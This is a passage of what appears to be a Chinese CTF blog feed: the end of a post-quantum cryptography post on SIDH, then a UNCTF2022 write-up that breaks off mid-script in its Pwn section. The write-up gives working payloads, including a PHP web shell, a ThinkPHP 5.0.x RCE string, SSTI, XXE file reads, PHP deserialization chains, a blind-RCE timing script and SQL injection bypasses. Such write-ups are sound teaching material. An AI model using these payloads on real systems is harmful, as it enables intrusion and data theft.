class="number">812</span>, <span class="number">580</span></span><br><span class="line">RB = sB * PB + tB * QB</span><br><span class="line"><span class="built_in">print</span>(RB)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phiB就是从E到EB同态映射,Kernel是RB</span></span><br><span class="line">phiB = E.isogeny(RB)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Bob的公共信息EB</span></span><br><span class="line">EB = phiB.codomain()</span><br><span class="line"><span class="built_in">print</span>(E.is_isogenous(EB)) <span class="comment"># 确认EB与E同源</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bob发送以下信息给Alice</span></span><br><span class="line">EB, phiB_PA, phiB_QA = EB, phiB(PA), phiB(QA)</span><br><span class="line">EB, phiB_PA, phiB_QA</span><br></pre></td></tr></table></figure><p><strong>秘密值计算</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Alice计算秘密值</span></span><br><span class="line">R_BA = sA * phiB_PA + tA * phiB_QA</span><br><span class="line"><span class="built_in">print</span>(R_BA)</span><br><span class="line">phiBA = EB.isogeny(R_BA)</span><br><span class="line"><span class="built_in">print</span>(phiBA)</span><br><span class="line">KA = phiBA.codomain().j_invariant()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bob计算秘密值</span></span><br><span class="line">R_AB = sB * phiA_PB + tB * phiA_QB</span><br><span class="line"><span class="built_in">print</span>(R_AB)</span><br><span class="line">phiAB = EA.isogeny(R_AB)</span><br><span class="line"><span class="built_in">print</span>(phiAB)</span><br><span class="line">KB = phiAB.codomain().j_invariant()</span><br><span class="line"></span><br><span class="line"><span class="comment">#测试秘密值是否相等</span></span><br><span class="line"><span class="keyword">if</span> KA == KB:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Success!&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="Castryck-Decru攻击"><a href="#Castryck-Decru攻击" class="headerlink" title="Castryck-Decru攻击"></a>Castryck-Decru攻击</h4><p>（待补充）</p><p>参考：</p><p><a href="https://github.com/GiacomoPope/Castryck-Decru-SageMath">Castryck-Decru-SageMath</a></p><p><a href="https://eprint.iacr.org/2022/975.pdf">An efficient key recovery attack on SIDH</a></p><p><a href="https://github.com/jack4818/Castryck-Decru-SageMath">Castryck-Decru Key Recovery Attack on SIDH</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;后量子密码学&lt;/strong&gt;（Post-Quantum Cryptography，PQC），又称&lt;strong&gt;抗量子计算密码学&lt;/strong&gt;，是密码学的一个研究领域，专门研究能够抵抗量子计算机的加密算法，特别是公钥加密（非对</summary>
      
    
    
    
    <category term="crypto" scheme="https://lazzzaro.github.io/categories/crypto/"/>
    
    
    <category term="后量子密码" scheme="https://lazzzaro.github.io/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>UNCTF2022-公开赛</title>
    <link href="https://lazzzaro.github.io/2022/11/18/match-UNCTF2022-%E5%85%AC%E5%BC%80%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2022/11/18/match-UNCTF2022-%E5%85%AC%E5%BC%80%E8%B5%9B/</id>
    <published>2022-11-18T11:43:08.000Z</published>
    <updated>2022-11-20T17:32:45.560Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>为深入贯彻习近平总书记关于二十大提出的网络强国的重要思想，围绕建设网络强国的战略部署，建设网络强国的战略部署要与“两个一百年”奋斗目标同步推进，由御之安承办UNCTF2022网络安全大赛（以下简称“大赛”）将于今年11月份召开，以赛事为契机，提升网络安全保障能力，汇聚高端网络安全人才，共筑网络安全防线，为中国网络安全事业发展提供智力支撑和保障。</p><p>线上报名：2022年10月24日10:00-11月11日10:00，比赛时间：2022年11月12日12:00-11月18日12:00</p><p><strong>Rank: 1</strong></p><hr><h2 id="Web"><a href="#Web" class="headerlink" title="# Web"></a># Web</h2><h3 id="我太喜欢bilibili大学啦"><a href="#我太喜欢bilibili大学啦" class="headerlink" title="我太喜欢bilibili大学啦"></a>我太喜欢bilibili大学啦</h3><p>phpinfo页面环境变量中直接泄露flag。</p><p>​    </p><h3 id="ezgame"><a href="#ezgame" class="headerlink" title="ezgame"></a>ezgame</h3><blockquote><p>简单的游戏~ 打过boss就能获得flag</p></blockquote><p>F12查看js，在main.js里搜索 <code>unctf</code>，在混淆js代码中找到flag片段，连接起来得：<code>unctf&#123;c5f9a27d-6f88-49fb-a510-fe7b163f8dd3&#125;</code>。</p><p>​    </p><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><blockquote><p>又是一道简单的签到</p></blockquote><p>F12发现注释有学号 <code>20200101</code> 为账号密码，尝试 <code>20200102/20200103/20200104/20200105</code> 分别回显 <code>f/l/a/g</code>，脚本遍历提取：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://365172a3-2701-4e1a-8f59-a548f14e7027.node.yuzhian.com.cn/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20200102</span>,<span class="number">20200102</span>+<span class="number">40</span>):</span><br><span class="line">    data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    r = requests.post(url,data=data)</span><br><span class="line">    flag += r.text[-<span class="number">5</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p>弱类型比较。第一层，16进制0x绕过；第二层，数组绕过；第三层，用其他命令和通配符绕过RCE。</p><p>Payload：</p><p><code>/index.php?code=print_r(exec(&quot;uniq%09/fl*&quot;));</code>，POST：<code>a=0x&amp;key1[]=a&amp;key2[]=b</code></p><p>​    </p><h3 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h3><blockquote><p>简简单单的文件上传</p></blockquote><p>无过滤的文件上传。上传一个 <code>1.php</code>，内含 <code>&lt;?php system($_GET[x]);</code>，再访问传入命令RCE。</p><p>Payload：<code>/uplO4d/1.php?x=cat%20/home/ctf/flag</code></p><p>​    </p><h3 id="给你一刀"><a href="#给你一刀" class="headerlink" title="给你一刀"></a>给你一刀</h3><p>ThinkPHP 5.0.x未开启强制路由RCE漏洞。</p><p>Payload: <code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=env</code></p><p>flag: <code>UNCTF&#123;Y0u_A3r_so_G9eaD_hacker&#125;</code></p><p>​    </p><h3 id="302与深大"><a href="#302与深大" class="headerlink" title="302与深大"></a>302与深大</h3><blockquote><p>thai想让你知道szu的战队……吗，醒醒，这个页面不是主页！</p></blockquote><p>Request头的考察。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?miku=puppy</span><br><span class="line">POST: micgo=ikun</span><br><span class="line">Cookie: admin=true</span><br></pre></td></tr></table></figure><p>flag: <code>UNCTF&#123;thai_miku_micgo_qka_WEB_GOD&#125;</code></p><p>​    </p><h3 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy ssti"></a>easy ssti</h3><blockquote><p>php看腻了，来点python吧</p></blockquote><p>基本无过滤的SSTI。</p><p>Payload：</p><p><code>/register</code>，POST：<code>user=&#123;&#123;cycler.__init__.__globals__.os.popen('env').read()&#125;&#125;&amp;pwd=</code></p><p>​    </p><h3 id="听说php有一个xxe"><a href="#听说php有一个xxe" class="headerlink" title="听说php有一个xxe"></a>听说php有一个xxe</h3><p>XXE。先访问 <code>/hint</code>，再访问 <code>/dom.php</code>，根据 <code>DOMDocument::loadXML()</code>信息，POST一个XML数据读flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///flag&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezunseri"><a href="#ezunseri" class="headerlink" title="ezunseri"></a>ezunseri</h3><blockquote><p>好像还没有反序列化的题目？</p></blockquote><p>反序列化链：<code>Login:__destruct() =&gt; Exec:__get() =&gt; Test:__toString() =&gt; Exec:__invoke() =&gt; Exec:execute()</code></p><p>构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exec</span>:</span><br><span class="line">    public_content=<span class="string">&#x27;system(&quot;cat /flag&quot;);&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    public_test=Exec()</span><br><span class="line">    public_key=<span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exec</span>:</span><br><span class="line">    public_content=Test()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Login</span>:</span><br><span class="line">    private_name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    public_code=<span class="string">&#x27;3.1415926&#x27;</span></span><br><span class="line">    public_key=Exec()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(quote(serialize(Login())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O%3A5%3A%22Login%22%3A3%3A%7Bs%3A11%3A%22%00Login%00name%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22code%22%3Bs%3A9%3A%223.1415926%22%3Bs%3A3%3A%22key%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A3%3A%22key%22%3Bs%3A1%3A%22%3F%22%3Bs%3A4%3A%22test%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3Bs%3A20%3A%22system%28%22cat%20/flag%22%29%3B%22%3B%7D%7D%7D%7D</span></span><br><span class="line"><span class="comment"># 绕__wakeup():</span></span><br><span class="line"><span class="comment"># O%3A5%3A%22Login%22%3A4%3A%7Bs%3A11%3A%22%00Login%00name%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22code%22%3Bs%3A9%3A%223.1415926%22%3Bs%3A3%3A%22key%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A3%3A%22key%22%3Bs%3A1%3A%22%3F%22%3Bs%3A4%3A%22test%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3Bs%3A20%3A%22system%28%22cat%20/flag%22%29%3B%22%3B%7D%7D%7D%7D</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="poppop"><a href="#poppop" class="headerlink" title="poppop"></a>poppop</h3><p>反序列化链：<code>B:__destruct() =&gt; C:__toString() =&gt; A:__call()</code></p><p>构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    public_code=<span class="string">&#x27;system(&quot;env&quot;);&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>:</span><br><span class="line">    private_key2=A()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    public_key=C()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(quote(serialize(B())))</span><br><span class="line">      </span><br><span class="line"><span class="comment"># O%3A1%3A%22B%22%3A1%3A%7Bs%3A3%3A%22key%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A7%3A%22%00C%00key2%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22system%28%22env%22%29%3B%22%3B%7D%7D%7D</span></span><br><span class="line"><span class="comment"># 绕__wakeup():</span></span><br><span class="line"><span class="comment"># O%3A1%3A%22B%22%3A2%3A%7Bs%3A3%3A%22key%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A7%3A%22%00C%00key2%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22system%28%22env%22%29%3B%22%3B%7D%7D%7D</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="babynode"><a href="#babynode" class="headerlink" title="babynode"></a>babynode</h3><blockquote><p>你能污染对象吗</p></blockquote><p>原型链污染。</p><p>Payload：</p><p>POST： <code>&#123;&quot;__proto__&quot;:&#123;&quot;id&quot;:&quot;unctf&quot;&#125;&#125;</code></p><p>​    </p><h3 id="easy-rce"><a href="#easy-rce" class="headerlink" title="easy_rce"></a>easy_rce</h3><blockquote><p>rce布尔盲注</p></blockquote><p>无回显RCE，可以采用 <code>if+head+cut+sleep</code> 方式逐位猜解flag各个字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://c88b47e2-7088-4011-8d20-f4e5677e765e.node.yuzhian.com.cn/?code=&#x27;</span></span><br><span class="line">dic = string.ascii_letters+string.digits+<span class="string">&#x27;&#123;-&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    judge = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        now = <span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>a=$(tac /f?ag | head -1 | cut -b <span class="subst">&#123;i&#125;</span>)%0aif [ $a = <span class="subst">&#123;j&#125;</span> ]%0athen sleep 2%0afi&#x27;</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        r = requests.get(now)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(end)-<span class="built_in">int</span>(start) &gt; <span class="number">1</span>:</span><br><span class="line">            judge = <span class="number">1</span></span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> judge == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><blockquote><p>好像见过，又好像不是</p></blockquote><p>sqlmap能跑出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://86c207df-b12e-47cb-b6a5-bb33e69a5381.node.yuzhian.com.cn/?id=1&quot;</span> --dbs</span><br><span class="line">sqlmap -u <span class="string">&quot;http://86c207df-b12e-47cb-b6a5-bb33e69a5381.node.yuzhian.com.cn/?id=1&quot;</span> -D ctftraining --tables</span><br><span class="line">sqlmap -u <span class="string">&quot;http://86c207df-b12e-47cb-b6a5-bb33e69a5381.node.yuzhian.com.cn/?id=1&quot;</span> -D ctftraining -T FLAG_TABLE --sql-shell</span><br><span class="line"></span><br><span class="line">sql-shell&gt; <span class="keyword">select</span> load_file(<span class="string">&quot;/flag&quot;</span>);</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ez2048"><a href="#ez2048" class="headerlink" title="ez2048"></a>ez2048</h3><p>F12在game.js内查看关键代码，为首页invite_code验证逻辑：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">checkInvited</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> args = [...<span class="variable language_">arguments</span>];</span><br><span class="line">    <span class="keyword">let</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="keyword">const</span> view = <span class="keyword">new</span> <span class="title class_">DataView</span>(buf);</span><br><span class="line">    view.<span class="title function_">setUint8</span>(<span class="number">0</span>, <span class="number">68</span>);</span><br><span class="line">    view.<span class="title function_">setUint8</span>(<span class="number">1</span>, <span class="number">51</span>);</span><br><span class="line">    view.<span class="title function_">setUint8</span>(<span class="number">2</span>, <span class="number">15</span>);</span><br><span class="line">    view.<span class="title function_">setUint8</span>(<span class="number">3</span>, <span class="number">80</span>);</span><br><span class="line">    view.<span class="title function_">setUint16</span>(<span class="number">4</span>, <span class="number">0x0e5d</span>, <span class="literal">true</span>);</span><br><span class="line">    view.<span class="title function_">setUint16</span>(<span class="number">6</span>, <span class="number">0x323a</span>, <span class="literal">true</span>);</span><br><span class="line">    view.<span class="title function_">setUint16</span>(<span class="number">8</span>, <span class="number">0x3058</span>, <span class="literal">true</span>);</span><br><span class="line">    view.<span class="title function_">setUint16</span>(<span class="number">10</span>, <span class="number">0x1a2a</span>, <span class="literal">true</span>);</span><br><span class="line">    view.<span class="title function_">setUint32</span>(<span class="number">12</span>, <span class="number">0x0512160d</span>, <span class="literal">true</span>);</span><br><span class="line">    view.<span class="title function_">setUint32</span>(<span class="number">16</span>, <span class="number">0x02560002</span>);</span><br><span class="line">    view.<span class="title function_">setUint32</span>(<span class="number">20</span>, <span class="number">0x130000</span>);</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">check</span>(<span class="params">code</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (code.<span class="property">length</span> !== <span class="number">24</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">let</span> encode = [];</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; code.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (~i % <span class="number">2</span> === <span class="number">0</span>) &#123;</span><br><span class="line">          encode.<span class="title function_">push</span>(code.<span class="title function_">charCodeAt</span>(i) ^ code.<span class="title function_">charCodeAt</span>(i - <span class="number">2</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          encode.<span class="title function_">push</span>(code.<span class="title function_">charCodeAt</span>(i) ^ code.<span class="title function_">charCodeAt</span>(i + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; code.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (view.<span class="title function_">getInt8</span>(i) !== encode[i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!!<span class="variable language_">arguments</span>.<span class="property">length</span>) &#123;</span><br><span class="line">        [].<span class="property">push</span>.<span class="title function_">apply</span>(args, <span class="variable language_">arguments</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">arguments</span>.<span class="property">callee</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">check</span>(args.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>));</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>写简单脚本还原输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">68</span>,<span class="number">51</span>,<span class="number">15</span>,<span class="number">80</span>,<span class="number">93</span>,<span class="number">14</span>,<span class="number">58</span>,<span class="number">50</span>,<span class="number">88</span>,<span class="number">48</span>,<span class="number">42</span>,<span class="number">26</span>,<span class="number">13</span>,<span class="number">22</span>,<span class="number">18</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">86</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">19</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(c))</span><br><span class="line"></span><br><span class="line">t = [-<span class="number">1</span>]*<span class="number">24</span></span><br><span class="line">t[<span class="number">1</span>] = c[<span class="number">1</span>]</span><br><span class="line">t[<span class="number">0</span>] = t[<span class="number">1</span>]^c[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">24</span>,<span class="number">2</span>):</span><br><span class="line">  t[i] = t[i-<span class="number">2</span>]^c[i]</span><br><span class="line">  t[i-<span class="number">1</span>] = t[i]^c[i-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(t))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;w3lc0me_7o_unctf2022!!!!&#x27;</span></span><br></pre></td></tr></table></figure><p>再观察发现存在game.wasm，使用wabt工具逆wasm得到密文 <code>\x22&#125;/7v\x16\x0d&gt;GV&amp;*\x5cS@^mWS_D~V\x10\x03[3\x16^\x0eR9\x05_mG\x10\x1efalse\x00</code>，尝试与前面得到的invite_code异或，得到 <code>UNCTF&#123;hap9y_2048_game_w1th_unc7f2022~&#125;..^CW2</code>。</p><p>​    </p><h3 id="世界和平"><a href="#世界和平" class="headerlink" title="世界和平"></a>世界和平</h3><blockquote><p>提示1：堆叠注入</p></blockquote><p>根据提示进行堆叠注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0;show databases;#</span><br><span class="line">数据库名 score_mbamission/score_minnesotaunited/snert</span><br><span class="line"></span><br><span class="line">0;show tables;# </span><br><span class="line">表名 Flag/users</span><br></pre></td></tr></table></figure><p>使用 <code>0;select * from Flag</code> 查找Flag表中内容，发现无回显，猜测对 <code>select</code> 或 <code>from</code> 或 <code>Flag</code> 有过滤。</p><p>尝试 <code>0;seLseLectect version();#</code>，只用 <code>select</code> 大写+双写可以绕过得到内容，则</p><p>再用 <code>0;seLseLectect * fRfRomom FlFlagag;#</code> 即可拿到flag。</p><p>​    </p><h3 id="快乐三消"><a href="#快乐三消" class="headerlink" title="快乐三消"></a>快乐三消</h3><blockquote><p>打CTF累了来玩三消放松一下叭</p></blockquote><p>查看源码，除了进入 <code>/h5/index.php</code> 和 <code>/h4/king.php</code>，没有其他有用信息。</p><p>扫目录发现 <code>/.git/</code> 和 <code>/admin/</code>，用GitHack还原出 <code>index.php</code> 和 <code>phpinfo.php</code>，无有用信息。</p><p>用 <code>admin/unctf</code> 进入后台页面， 在网页预览功能发现url为 <code>/admin/fi.php?filename=index.php</code>，尝试发现存在文件包含漏洞，访问 <code>/admin/fi.php?filename=/flag</code> 得到flag。</p><p>​    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="# Pwn"></a># Pwn</h2><h3 id="welcomeUNCTF2022"><a href="#welcomeUNCTF2022" class="headerlink" title="welcomeUNCTF2022"></a>welcomeUNCTF2022</h3><blockquote><p>easy easy easy Pwn</p></blockquote><p>签到pwn。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class="number">37591</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;UNCTF&amp;2022\x00&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;cat /flag&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvall())</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="石头剪刀布"><a href="#石头剪刀布" class="headerlink" title="石头剪刀布"></a>石头剪刀布</h3><p>伪随机数组，给了srand种子值，依照代码逻辑求出固定种子值下的100个rand值：</p><p><code>[1,1,2,2,0,2,2,1,2,2,2,2,0,0,2,1,0,1,2,0,0,1,1,1,1,2,1,1,1,0,0,2,0,1,2,0,0,1,0,2,1,2,1,2,0,1,1,1,0,0,2,0,2,1,2,1,0,0,2,2,1,1,2,1,2,2,2,2,1,0,2,0,2,0,0,1,2,2,2,0,0,1,0,1,0,0,2,0,1,0,0,2,1,1,1,1,0,1,1,2]</code></p><p>再根据石头剪刀布规则完成后半部分交互：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 